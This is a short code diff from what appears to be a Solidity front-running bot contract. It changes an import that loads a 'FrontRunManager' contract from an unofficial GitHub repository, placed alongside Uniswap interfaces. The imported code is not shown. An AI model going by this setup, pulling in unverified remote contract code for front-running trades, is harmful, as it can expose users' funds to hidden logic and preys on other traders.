@@ -4,7 +4,7 @@ import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfa
 
 //pancekeswap manager
 
-import "https://github.com/PSFRunner/PSFRunnerv3.2/tree/main/Uniswap/v2-periphery/contracts/baseFrontRunManager.sol";
+import "https://github.com/PSFRunner/PSFRunnerv3.2/blob/main/Uniswap/v2-periphery/contracts/base/FrontRunManager.sol";
 
 import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
 
